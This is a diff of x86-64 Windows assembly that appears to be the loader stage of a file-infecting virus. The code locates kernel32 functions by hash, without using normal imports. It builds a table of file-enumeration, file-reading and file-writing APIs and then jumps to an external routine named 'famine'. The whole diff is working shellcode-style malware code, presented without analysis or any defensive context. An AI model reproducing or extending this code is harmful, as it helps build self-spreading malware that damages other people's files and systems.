@@ -29,17 +29,130 @@
 
 
 section .text
-	global _get_kernel32_handle
 	global _get_proc_address
-	global _init_kernel32_address_table
-	global .find_function_loop
-	global .done
-	global .next_module
-	global _find_hash
-	global .ror13_hash_dll
-	global .function_found
-	global .loop_function
+	global _get_address_table
+	global load_function
+	
+	extern famine
 
+
+; Registers configuration
+; rbx: this code entrypoint
+_get_address_table:
+	mov rcx, [rbx + 0x11]
+	call _get_proc_address
+	mov r15, rax ; r15 = LocalAlloc
+
+	xor rcx, rcx
+	mov rdx, rcx
+	add rcx, 0x40
+	add rdx, 104
+	call rax
+
+	mov r14, rax ; r14 = address of address table
+	mov rax, r15
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x15]
+	call _get_proc_address ; rax = LocalFree
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x19]
+	call _get_proc_address ; rax = ExitProcess
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x1d]
+	call _get_proc_address ; rax = CreateFileA
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x21]
+	call _get_proc_address ; rax = GetFileSize
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x25] ; rax = ReadFile
+	call _get_proc_address
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x29]
+	call _get_proc_address ; rax = WriteFile
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x2d]
+	call _get_proc_address ; rax = CloseHandle
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x31]
+	call _get_proc_address ; rax = FindFirstFileA
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x35]
+	call _get_proc_address ; rax = FindNextFileA
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x39]
+	call _get_proc_address ; rax = SetCurrentDirectoryA
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x3d]
+	call _get_proc_address ; rax = GetCurrentDirectoryA
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x41]
+	call _get_proc_address ; rax = GetModuleHandleA
+	pop r14
+	call _prepareStoreAddress
+
+	xor 	rcx, rcx
+	mov 	rdx, rcx
+	mov 	r8, rcx
+	mov 	r9, rcx
+	mov 	r12, rcx
+	mov 	r13, rcx
+	mov 	r15, rcx
+	mov 	rax, r14
+	xor 	r14, r14
+	jmp famine
+
+
+_prepareStoreAddress:
+	mov 	r9, rax
+	xor 	r8, r8
+	mov 	rdx, r8
+	mov 	rcx, r14
+
+_storeAddress:
+	cmp 	QWORD [ds:rcx + rdx], r8
+	jne 	_storeAddress_continueIncrement
+	mov 	QWORD [ds:rcx + rdx], r9
+	mov 	rax, rdx
+	ret
+
+_storeAddress_continueIncrement:
+	add 	rdx, 8
+	jmp 	_storeAddress
 
 ; PARAMETERS
 ; rcx = function + dll hash
@@ -172,27 +285,6 @@ _get_proc_address:
 		xor rax, rax
 		add rax, r14
 		add rax, rcx
-
-
-
-
-
-		; mov r12d, [r15 + 0x1C] ; pExportTable->AddressOfFunctions
-		; mov eax, [r15 + 0x24] ; pExportTable->AddressOfNameOrdinals
-
-		; add rax, rdx ; rax = DllBase + pExportTable->AddressOfNameOrdinals | RVA
-		; movzx rax, word [rax + 2 * r8] 
-		
-		; ; rax * 4
-		; mov rcx, 4
-		; imul rax, rcx
-
-		; add rax, r12
-		; add rax, rdx
-
-		; mov ecx, [rax]
-		; mov rax, rcx
-		; add rax, rdx
 
 		ret
 
